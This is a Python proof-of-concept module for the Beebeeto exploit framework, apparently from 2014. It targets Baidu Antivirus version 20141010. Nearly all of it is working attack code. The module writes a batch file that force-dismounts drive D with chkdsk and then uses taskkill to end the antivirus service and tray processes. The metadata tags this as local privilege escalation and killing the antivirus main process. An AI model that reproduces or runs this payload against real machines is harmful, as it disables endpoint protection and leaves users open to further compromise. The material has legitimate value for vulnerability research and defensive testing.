#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0153',
            'name': '百度杀毒 20141010 chkdsk taskkill主进程 POC',
            'author': '雷蜂',
            'create_date': '2014-11-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '百度',
            'vul_version': ['20141010'],
            'type': 'Other',
            'tag': ['本地提权', '杀掉百度杀毒主进程', 'chkdsk taskkill', '百度杀毒漏洞'],
            'desc': 'Wooyun Author zhuixing',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-078656',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payload = '''
@echo off
mode con cols=20 lines=1
chkdsk /x d:
taskkill /F /IM baidusdsvc.exe /T
taskkill /F /IM baidusdtray.exe /T
'''
        # write
        test_bat = open('./baidu-anti-virus-taskkill.bat', 'w')
        test_bat.write(payload)
        test_bat.close()
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok, file: ./baidu-anti-virus-taskkill.bat'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())